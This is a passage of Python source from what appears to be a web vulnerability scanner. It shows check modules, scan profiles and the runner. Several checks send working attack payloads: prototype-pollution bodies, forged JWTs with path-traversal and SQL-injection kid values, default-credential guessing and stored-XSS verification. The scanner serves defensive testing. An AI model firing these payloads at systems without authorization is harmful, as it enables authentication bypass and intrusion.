        planted.append((form, action, payload, inputs[0]))
    if not planted:
        return
    pages = []
    for form, action, _, _ in planted:
        for pg in (form.get("page"), action):
            if pg and pg not in pages:
                pages.append(pg)
    for pg in list(surf.pages)[:8]:
        if pg not in pages:
            pages.append(pg)
    bodies = {}
    for pg in pages[:10]:
        try:
            # header probe: memaksa fetch segar (melewati cache klien) —
            # snapshot sebelum tanam tidak boleh menutupi bukti stored.
            r = ctx.client.get(pg, headers=_VERIFY_HDR)
        except Exception:
            continue
        if r.status == 200:
            bodies[pg] = r.body or ""
    for form, action, payload, first_input in planted:
        for pg, body in bodies.items():
            if payload in body:
                add(F("HIGH", f"Stored XSS verified (persistent): {pg}",
                      'A payload planted through a form is stored by the application and rendered unescaped on a later, separate page view — any visitor of that page executes attacker script in the application origin.',
                      evidence=f"payload planted via POST form at {action} renders raw on GET {pg}: {payload}",
                      cwe="CWE-79", owasp="A03:2021", cvss=6.5,
                      remed='Encode all user-supplied content on output (context-aware) and validate input; deploy a restrictive Content-Security-Policy as defense in depth.',
                      confidence="confirmed", location=pg, param=first_input))
                break


def c_prototype_pollution(ctx, add):
    """Prototype pollution: kirim {"__proto__": {key: marker}} ke endpoint
    JSON, lalu buktikan key marker itu MUNCUL pada respons permintaan NETRAL
    berikutnya (yang tidak memuat key itu sama sekali) — echo biasa dari
    request yang sama tidak pernah dihitung sebagai bukti."""
    cand = []
    for u in list(ctx.surface().js_endpoints) + list(ctx.surface().param_urls):
        ep = (u or "").split("?")[0]
        if "/api/" in ep and ep not in cand:
            cand.append(ep)
    hdr = {"Content-Type": "application/json"}
    for ep in cand[:6]:
        key = "vxpp" + ctx.marker
        hit = False
        for body in ({"__proto__": {key: "polluted"}},
                     {"constructor": {"prototype": {key: "polluted"}}}):
            try:
                ctx.client.post(ep, data=json.dumps(body), headers=hdr)
                v1 = ctx.client.post(ep, data="{}", headers=hdr)
                v2 = ctx.client.get(ep, headers=_VERIFY_HDR)
            except Exception:
                continue
            for resp in (v1, v2):
                if resp.status == 200 and key in (resp.body or "") \
                        and "polluted" in (resp.body or ""):
                    hit = True
                    break
            if hit:
                break
        if hit:
            add(F("HIGH", f"Prototype pollution confirmed: {ep}",
                  'A __proto__ payload sent to this JSON endpoint permanently alters the server-side object prototype: a later neutral request (which never contained the key) returns the planted property. Depending on what the application reads from polluted defaults, this can bypass authorization checks or crash the service.',
                  evidence=f"planted key '{key}' persists in neutral responses from {ep}",
                  cwe="CWE-1321", owasp="A08:2021", cvss=7.5,
                  remed='Reject or strip __proto__/constructor/prototype keys on JSON input; use Object.create(null) or Map for merge targets; freeze prototypes.',
                  confidence="confirmed", location=ep))


def c_jwt_kid_injection(ctx, add):
    """JWT kid injection: baseline endpoint identitas harus dulu terbukti
    menerima token asli. Baru dua serangan kid diuji — traversal ke
    /dev/null (kunci kosong) dan SQLi di kid (kunci = literal hasil query).
    Hanya pantulan identitas PALSU yang menjadi temuan confirmed."""
    for tok in _find_jwts(ctx):
        parts = tok.split(".")
        if len(parts) != 3:
            continue
        header, payload = _b64url_json(parts[0]), _b64url_json(parts[1])
        if not header or not isinstance(payload, dict):
            continue
        idkey = next((k for k in ("user", "sub", "id", "username", "email")
                      if k in payload), None)
        if not idkey:
            continue

        def probe(ep, token):
            return ctx.client.request(
                "GET", ep, headers={"Authorization": f"Bearer {token}"})

        for ep in ("/api/me", "/api/user", "/api/profile", "/api/auth/me",
                   "/api/v1/me", "/me"):
            try:
                r0 = probe(ep, tok)
            except Exception:
                continue
            if r0.status != 200 or str(payload[idkey]) not in (r0.body or ""):
                continue
            forged_val = "ptk-forged-admin"
            forged_payload = dict(payload, **{idkey: forged_val})

            def craft(kid, key):
                h = _b64url_encode(json.dumps(
                    {"alg": "HS256", "typ": "JWT", "kid": kid}).encode())
                pl = _b64url_encode(json.dumps(forged_payload).encode())
                mac = hmac_mod.new(key, f"{h}.{pl}".encode(), hashlib.sha256)
                return f"{h}.{pl}.{_b64url_encode(mac.digest())}"

            attacks = (
                ("path traversal to /dev/null (empty key)",
                 craft("../../dev/null", b"")),
                ("SQL injection in kid",
                 craft("' UNION SELECT 'vxkidkey' -- ", b"vxkidkey")),
            )
            for label, forged in attacks:
                try:
                    r1 = probe(ep, forged)
                except Exception:
                    continue
                if r1.status == 200 and forged_val in (r1.body or ""):
                    add(F("CRITICAL",
                          f"JWT kid injection ({label}): {ep}",
                          'The endpoint uses the JWT kid header without sanitization, letting an attacker choose the verification key (a file path or an SQL fragment) and forge arbitrary identities — full authentication bypass.',
                          evidence=f"forged identity '{forged_val}' accepted at {ep} via kid {label}",
                          cwe="CWE-347", owasp="A07:2021", cvss=9.8,
                          remed='Never let kid select keys from the filesystem or a database query; pin a server-side key allowlist and reject unexpected kid values.',
                          confidence="confirmed", location=ep))


def c_graphql_deep(ctx, add):
    """GraphQL pendalaman: (a) query batching (amplifikasi brute-force/DoS),
    (b) field suggestion leakage (skema bocor dari pesan error walau
    introspeksi mati). Keduanya berbasis respons nyata endpoint GraphQL
    yang baseline-nya terbukti menjawab {__typename}."""
    cand = []
    for u in list(ctx.surface().js_endpoints) + list(ctx.surface().param_urls):
        ep = (u or "").split("?")[0]
        if "graphql" in ep.lower() and ep not in cand:
            cand.append(ep)
    if "/graphql" not in cand:
        cand.append("/graphql")
    hdr = {"Content-Type": "application/json"}
    for ep in cand[:3]:
        try:
            base = ctx.client.post(ep, data=json.dumps({"query": "{__typename}"}),
                                   headers=hdr)
        except Exception:
            continue
        if base.status != 200 or '"data"' not in (base.body or ""):
            continue
        try:
            arr = ctx.client.post(
                ep, headers=hdr,
                data=json.dumps([{"query": "{__typename}"},
                                 {"query": "{__typename}"}]))
            parsed = json.loads(arr.body or "")
            if (isinstance(parsed, list) and len(parsed) == 2
                    and all(isinstance(x, dict) and "data" in x for x in parsed)):
                add(F("LOW", f"GraphQL query batching enabled: {ep}",
                      'The endpoint executes JSON-array query batches, letting an attacker pack many operations (login attempts, object enumeration) into a single HTTP request and bypass per-request rate limits.',
                      evidence="array of 2 queries answered with 2 data results in one response",
                      cwe="CWE-770", owasp="API4:2023", cvss=3.7,
                      remed='Disable array batching or cap batch size; enforce rate limits per operation, not per request.',
                      confidence="probable", location=ep))
        except Exception:
            pass
        try:
            sug = ctx.client.post(ep, data=json.dumps({"query": "{ vxbadfield }"}),
                                  headers=hdr)
            if "Did you mean" in (sug.body or ""):
                add(F("LOW", f"GraphQL field suggestion leakage: {ep}",
                      'Error responses include "Did you mean" field suggestions, disclosing valid schema field names even when introspection is disabled — an attacker can reconstruct the schema interactively.',
                      evidence=(sug.body or "")[:200],
                      cwe="CWE-209", owasp="API8:2023", cvss=3.7,
                      remed='Disable field suggestions in production (e.g. hideSchemaDetails / custom error formatting).',
                      confidence="probable", location=ep))
        except Exception:
            pass


def c_default_credentials(ctx, add):
    """Cek kredensial default pada endpoint yang meminta HTTP Basic Auth.
    Hanya endpoint 401+WWW-Authenticate yang diuji, maks 8 kombinasi, berhenti di sukses pertama."""
    import base64 as _b64
    probes = ["/admin", "/manager/html", "/admin-basic", "/management", "/console",
              "/api/admin", "/system", "/protected"]
    for path in probes:
        if ctx.cancelled():
            return
        r = ctx.client.get(path)
        if r.status != 401 or "basic" not in (r.hdr("www-authenticate") or "").lower():
            continue
        for user, pw in DEFAULT_CREDS:
            tok = _b64.b64encode(f"{user}:{pw}".encode()).decode()
            rr = ctx.client.get(path, headers={"Authorization": f"Basic {tok}"})
            if rr.status == 200:
                add(F("CRITICAL", f"Default credentials work: {path} ({user}:{pw})",
                      'The Basic Auth endpoint accepted a default/built-in credential pair tried from a common list — administrative access is open.',
                      evidence=f"Basic {user}:**** -> HTTP 200", cwe="CWE-798",
                      owasp="A07:2021 Identification & Authentication Failures", cvss=9.8,
                      remed='Change ALL default passwords; disable built-in accounts; restrict consoles via the network.',
                      confidence="confirmed", location=path))
                return
        ctx.L(f"  [creds] {path} requests Basic Auth — 8 default credentials rejected")


def c_rate_limit_login(ctx, add):
    """Login form tanpa rate-limit yang terlihat: 6 percobaan gagal beruntun untuk
    username yang TIDAK ADA (tidak mengunci akun siapa pun) tetap dilayani normal."""
    surf = ctx.surface(full=True)
    for form in surf.forms:
        if form["method"] != "POST":
            continue
        names = [i.lower() for i in form["inputs"]]
        if not any("user" in n or "email" in n or "login" in n for n in names):
            continue
        uname_field = form["inputs"][names.index(next(n for n in names
                        if "user" in n or "email" in n or "login" in n))]
        pw_field = next((i for i in form["inputs"] if "pass" in i.lower()), "password")
        ok = 0
        for i in range(6):
            if ctx.cancelled():
                return
            data = f"{uname_field}=ptk-nonexistent-probe&{pw_field}=wrong-{i}-{ctx.marker}"
            r = ctx.client.post(form["action"], data=data)
            if r.status in (200, 401, 403) and "captcha" not in (r.body or "").lower() \
                    and r.status != 429:
                ok += 1
        if ok == 6:
            add(F("MEDIUM", f"No rate limiting/lockout detected on login: {form['action']}",
                  '6 consecutive failed login attempts (with a nonexistent probe username) were all served without 429, lockout, or CAPTCHA — credential brute-forcing is unimpeded at the application layer.',
                  evidence='6/6 attempts served normally', cwe="CWE-307",
                  owasp="A07:2021", cvss=5.3,
                  remed='Apply per-IP+account rate limiting, progressive lockout, and/or CAPTCHA after several failures.',
                  confidence="probable", location=form["action"]))
        return


def c_email_security(ctx, add):
    """Postur email domain (SPF/DMARC) via DNS-over-HTTPS — bagian standar audit
    enterprise karena domain tanpa SPF/DMARC dapat dipalsukan untuk phishing."""
    from scanners import doh_query, org_domain
    host = ctx.client.host or ""
    if not host or all(c.isdigit() or c == "." for c in host) or ":" in host:
        return  # target IP: tidak relevan
    dom = org_domain(host)
    spf = doh_query(dom, "TXT")
    if spf is None:
        ctx.L('  [email] DoH unreachable — SPF/DMARC checks skipped (not treated as a finding)')
        return
    spf_recs = [r for r in spf if "v=spf1" in r]
    if not spf_recs:
        add(F("MEDIUM", f"Domain {dom} without an SPF record",
              f"No SPF record — any mail server can claim to send from @{dom} (spoofing/phishing in the domain's name).",
              evidence='TXT query: no v=spf1', cwe="CWE-290",
              owasp="A07:2021", cvss=5.3,
              remed='Publish SPF (v=spf1 ... -all) for legitimate sending domains.',
              confidence="confirmed", location=dom))
    elif any(r.rstrip('" ').endswith(("+all", "~all")) for r in spf_recs):
        add(F("MEDIUM", f"SPF record {dom} too permissive (+all/~all)",
              'SPF ends with +all or ~all — its anti-spoofing effectiveness is weak.',
              evidence=spf_recs[0][:100], cwe="CWE-290", owasp="A07:2021", cvss=5.3,
              remed='End SPF with -all (hard fail) after inventorying valid senders.',
              confidence="confirmed", location=dom))
    dmarc = doh_query(f"_dmarc.{dom}", "TXT")
    if dmarc is not None:
        drecs = [r for r in dmarc if "v=DMARC1" in r]
        if not drecs:
            add(F("MEDIUM", f"Domain {dom} without a DMARC record",
                  'Without DMARC, the domain owner cannot instruct receivers to reject spoofed email and does not receive abuse reports.',
                  evidence=f"TXT _dmarc.{dom}: empty", cwe="CWE-290",
                  owasp="A07:2021", cvss=5.3,
                  remed='Publish DMARC gradually: p=none (monitor) -> quarantine -> reject.',
                  confidence="confirmed", location=f"_dmarc.{dom}"))
        elif any("p=none" in r for r in drecs):
            add(F("LOW", f"DMARC {dom} is still p=none (monitor mode)",
                  'DMARC is present but policy p=none does not reject spoofing — it only monitors.',
                  evidence=drecs[0][:100], cwe="CWE-290", owasp="A07:2021", cvss=3.1,
                  remed="Raise the policy to p=quarantine, then p=reject, after a clean monitoring period.",
                  confidence="confirmed", location=f"_dmarc.{dom}"))


TAKEOVER_FPS = [
    ("github.io", "There isn't a GitHub Pages site here", "GitHub Pages"),
    ("herokuapp.com", "No such app", "Heroku"),
    ("azurewebsites.net", "404 Web Site not found", "Azure Web Apps"),
    ("s3.amazonaws.com", "NoSuchBucket", "AWS S3"),
    ("cloudfront.net", "Bad request", "CloudFront"),
    ("fastly.net", "Fastly error: unknown domain", "Fastly"),
    ("zendesk.com", "Help Center closed", "Zendesk"),
    ("shopify.com", "Sorry, this shop is currently unavailable", "Shopify"),
]


def c_subdomain_takeover(ctx, add):
    """Dangling CNAME: host menunjuk layanan pihak ketiga yang klaimnya sudah lepas."""
    from scanners import doh_query
    host = ctx.client.host or ""
    if not host or all(c.isdigit() or c == "." for c in host):
        return
    cnames = doh_query(host, "CNAME")
    if not cnames:
        return
    target_cname = cnames[0].strip('"').rstrip(".")
    home = ctx.client.get("/")
    body = home.body or ""
    for suffix, sign, label in TAKEOVER_FPS:
        if target_cname.endswith(suffix) and sign.lower() in body.lower():
            add(F("HIGH", f"Subdomain takeover indication: {host} -> {target_cname}",
                  f"CNAME points to {label} and the service answers with an 'unclaimed' signature ({sign}) — an attacker can register that name and take over the subdomain.",
                  evidence=f"CNAME {target_cname}; signature: {sign}", cwe="CWE-350",
                  owasp="A05:2021", cvss=7.4,
                  remed='Remove the dangling CNAME record or reclaim that service name.',
                  confidence="probable", location=host))
            return


# ------------------------------------------------------------ runner

_PASSIVE_BASE = ["c_version_disclosure", "c_tech_fingerprint", "c_security_headers",
                 "c_cookie_security", "c_cors", "c_tls"]
_ACTIVE_BASE = ["c_waf_detection", "c_sensitive_files", "c_directory_listing",
                "c_admin_panels", "c_http_methods", "c_open_redirect", "c_csrf_forms",
                "c_jwt_analysis", "c_api_exposure", "c_error_disclosure",
                "c_js_libraries", "c_sri_and_session", "c_auth_surface",
                "c_upload_surface", "c_deserialization_surface",
                "c_security_txt_robots", "c_api_sensitive_data"]
_ADVANCED = ["c_host_header", "c_web_injection", "c_crlf_injection", "c_ssrf",
             "c_blind_oob",
             "c_jwt_forgery", "c_websocket_surface",
             "c_broken_access_idor", "c_bola_matrix", "c_nosql_api", "c_json_fuzz",
             "c_stored_xss", "c_prototype_pollution", "c_jwt_kid_injection", "c_graphql_deep", "c_dom_xss", "c_wp_plugins",
             "c_source_disclosure", "c_session_fixation",
             "c_password_reset_poisoning", "c_cache_poisoning", "c_email_security",
             "c_cve_candidates"]
PROFILES = {
    "passive-quick": ["c_version_disclosure", "c_security_headers", "c_tls"],
    "passive-full": _PASSIVE_BASE + ["c_email_security"],
    "active-standard": _PASSIVE_BASE + _ACTIVE_BASE,
    "active-deep": _PASSIVE_BASE + ["c_services"] + _ACTIVE_BASE + _ADVANCED,
    # ENTERPRISE: semua check + yang paling intrusif/berat (kredensial default,
    # uji rate-limit login, takeover) — hanya untuk engagement dengan scope tertulis.
    "enterprise-full": _PASSIVE_BASE + ["c_services"] + _ACTIVE_BASE + _ADVANCED +
                       ["c_default_credentials", "c_rate_limit_login",
                        "c_subdomain_takeover"],
}
PASSIVE_PROFILES = ("passive-quick", "passive-full")

SEV_WEIGHT = {"CRITICAL": 25, "HIGH": 15, "MEDIUM": 7, "LOW": 3, "INFO": 1}
CONF_FACTOR = {"confirmed": 1.0, "probable": 0.7, "candidate": 0.4}


def risk_score(findings):
    """Skor risiko 0-100 (semakin tinggi semakin buruk): bobot severity x confidence."""
    raw = sum(SEV_WEIGHT.get(f["severity"], 0) * CONF_FACTOR.get(f.get("confidence", "probable"), 0.7)
              for f in findings)
    return min(100, round(raw))


def run_vulnscan(target, profile="active-deep", log=None, opts=None, cancelled=None):
    if profile not in PROFILES:
        profile = "active-deep"
    opts = opts or {}
    eff_target, scheme_note = target, None
    if "://" not in target:
        eff_target, scheme_note = netclient.resolve_scheme_target(target)
    ctx = Ctx(eff_target, opts, log, job_cancel=cancelled)
    def L(msg):
        ctx.L(msg)
    host = ctx.client.host
    method = "passive" if profile in PASSIVE_PROFILES else "active"
    L(f"[init] target={target} profile={profile} ({method.upper()}) marker={ctx.marker}")
    if scheme_note:
        L(f"[init] {scheme_note} -> effective target: {eff_target}")
    if ctx.client.proxy:
        L(f"[init] egress web via proxy {ctx.client.proxy['host']}:{ctx.client.proxy['port']} (port-scan/TLS still use direct connections)")
    L(f"[init] resolve {host} ...")
    ips = resolve_host(host) if host else []
    L(f"[init] resolved: {', '.join(ips) if ips else 'FAILED (host not found)'}")
    if not ips and host not in ("localhost",):
        L('[warn] DNS failed — scan still attempted (target may be a local IP/host)')

    aborted = False
    if profile not in PASSIVE_PROFILES:
        _pre = ctx.client.get(ctx.client.base_path or "/")
        if _pre.status == 0:
            _pre = ctx.client.get("/")
        if _pre.status == 0:
            aborted = True
            L(f"[abort] preflight failed: target did not respond to a single request ({eff_target})")
            _abort_finding = F(
                "INFO", "Target unreachable — scan aborted early",
                "The target did not respond to any HTTP request during "
                "preflight (every attempt failed or timed out), so the scan "
                "was aborted instead of running all checks against an "
                "unresponsive target. This result is INCONCLUSIVE — it is "
                "not evidence that the target is secure.",
                evidence=(f"target={eff_target} "
                          f"attempts={ctx.client.stats.get('attempts')} "
                          f"responses={ctx.client.stats.get('total')}"),
                remed="Verify the URL (including the http/https scheme) and "
                      "that the target is reachable from the scanner, then "
                      "re-run the scan.")

    headless_note = None
    if opts.get("headless"):
        try:
            import headless as _hl
            ok, reason = _hl.available()
            if ok:
                url0 = ctx.client.origin + (ctx.client.base_path or "/")
                L(f"[headless] rendering {url0} ...")
                rr = _hl.render(url0)
                opts["headless_endpoints"] = rr["endpoints"]
                L(f"[headless] render OK — {len(rr['endpoints'])} endpoints from DOM/network")
            else:
                headless_note = (f"Headless rendering requested but unavailable "
                                 f"({reason}) — static crawl used; SPA-only "
                                 f"endpoints may be missed.")
                L(f"[warn] {headless_note}")
        except Exception as e:
            headless_note = f"Headless rendering failed ({str(e)[:80]}) — static crawl used."
            L(f"[warn] {headless_note}")

    findings = []
    seen_keys = set()
    def add(f):
        key = (f["title"], f.get("location", ""), f.get("param", ""))
        if key not in seen_keys:
            seen_keys.add(key)
            findings.append(f)
            L(f"  [{f['severity']}/{f['confidence']}] {f['title']} (CVSS {f['cvss']})")
        else:
            L(f"  [dedupe] skip duplikat: {f['title']}")

    if aborted:
        add(_abort_finding)

    errors = []
    checks_detail = []
    checks = PROFILES[profile]
    L(f"[run] {len(checks)} check modules will be run")
    t0 = time.time()
    ran = 0
    total_budget = float(opts.get("total_budget_s", 1800))
    check_budget = float(opts.get("check_budget_s", 600))
    for i, name in enumerate(checks, 1):
        if aborted:
            checks_detail.append({"name": name, "status": "skipped",
                                  "findings": 0, "duration_s": 0})
            continue
        if time.time() - t0 > total_budget:
            L(f"[stop] total scan budget ({total_budget:.0f}s) exhausted at check {i}/{len(checks)}")
            checks_detail.append({"name": name, "status": "skipped",
                                  "findings": 0, "duration_s": 0})
            continue
        if ctx.cancelled():
            L(f"[stop] scan cancelled by user at check {i}/{len(checks)}")
            checks_detail.append({"name": name, "status": "cancelled",
                                  "findings": 0, "duration_s": 0})
            continue
        fn = globals()[name]
        L(f"[{i}/{len(checks)}] {name} ...")
        n0, tc = len(findings), time.time()
        ctx._deadline = tc + check_budget
        try:
            fn(ctx, add)
            ran += 1
            _dur = round(time.time() - tc, 2)
            _st = "timeout" if _dur > check_budget else "ok"
            if _st == "timeout":
                L(f"[{i}/{len(checks)}] {name} stopped (budget {check_budget:.0f}s exhausted)")
            checks_detail.append({"name": name, "status": _st,
                                  "findings": len(findings) - n0,
                                  "duration_s": _dur})
            L(f"[{i}/{len(checks)}] {name} done")
        except netclient.RequestAborted:
            ran += 1
            _user = bool(cancelled and cancelled())
            checks_detail.append({"name": name,
                                  "status": "cancelled" if _user else "timeout",
                                  "findings": len(findings) - n0,
                                  "duration_s": round(time.time() - tc, 2),
                                  "error": "stopped: cancelled by user" if _user
                                           else f"per-check budget {check_budget:.0f}s exhausted"})
            L(f"[{i}/{len(checks)}] {name} {'CANCELLED' if _user else 'TIMEOUT (budget exhausted)'}")
        except Exception as e:
            errors.append(f"{name}: {str(e)[:120]}")
            checks_detail.append({"name": name, "status": "error",
                                  "findings": len(findings) - n0,
                                  "duration_s": round(time.time() - tc, 2),
                                  "error": str(e)[:120]})
            L(f"[{i}/{len(checks)}] {name} ERROR: {str(e)[:100]}")
        finally:
            ctx._deadline = None

    # ---- verification pass: temuan exposure 'confirmed' diminta ulang sekali lagi;
    # yang tidak dapat direproduksi diturunkan ke probable (jujur, bukan dihapus).
    downgraded = 0
    for f in findings:
        if f.get("confidence") == "confirmed" and 'exposed' in f["title"] \
                and f.get("location", "").startswith("/"):
            try:
                chk = ctx.client.get(f["location"])
                if chk.status != 200 or ctx.is_missing(chk):
                    f["confidence"] = "probable"
                    f["description"] += ' [Verification pass: not reproduced on re-request — downgraded to probable.]'
                    downgraded += 1
            except Exception:
                pass
    if downgraded:
        L(f"[verify] {downgraded} findings downgraded confirmed->probable (not reproduced)")
    # ---- scan health: rasio blokir tinggi = hasil mungkin tertekan WAF/rate-limit
    warnings = []
    if aborted:
        warnings.append("Target unreachable during preflight — scan aborted "
                        "early; results are inconclusive, not a clean bill "
                        "of health.")
    if headless_note:
        warnings.append(headless_note)
    st = ctx.client.stats
    if st.get("total", 0) >= 20 and st.get("blocked", 0) / max(1, st["total"]) > 0.2:
        warnings.append(f"{st['blocked']}/{st['total']} responses blocked (403/429) — scan results may be incomplete (WAF/rate-limit).")
        L(f"[warn] {warnings[-1]}")
    if st.get("throttled_events"):
        warnings.append(f"Adaptive backoff engaged {st['throttled_events']} time(s), {st['throttled_seconds']}s total — the target is rate-limiting; the scan slowed down to preserve coverage.")
        L(f"[warn] {warnings[-1]}")

    findings.sort(key=lambda f: (-SEV_ORDER[f["severity"]], -f["cvss"]))
    summary = {}
    by_conf = {}
    for f in findings:
        summary[f["severity"]] = summary.get(f["severity"], 0) + 1
        by_conf[f["confidence"]] = by_conf.get(f["confidence"], 0) + 1
    risk = next((s for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW"] if summary.get(s)), "CLEAN")
    dur = round(time.time() - t0, 1)
    L(f"[done] total {len(findings)} findings | confirmed={by_conf.get('confirmed',0)} probable={by_conf.get('probable',0)} candidate={by_conf.get('candidate',0)} | overall risk: {risk} | {dur} dtk | check jalan {ran}/{len(checks)}")
    score = risk_score(findings)
    L(f"[done] risk score: {score}/100")
    return {"type": "vulnscan", "target": eff_target,
            "effective_target": eff_target, "target_as_given": target,
            "profile": profile,
            "method": method, "scan_id_ref": ctx.marker,
            "technologies": ctx.technologies,
            "tech_profile": ctx.technologies, "findings": findings,
            "summary": summary, "summary_by_confidence": by_conf,
            "overall_risk": risk, "risk_score": score,
            "warnings": warnings, "http_stats": st,
            "errors": errors, "duration_s": dur,
            "checks_run": ran, "checks_total": len(checks),
            "checks_detail": checks_detail,
            "cancelled": bool(ctx.cancelled())}
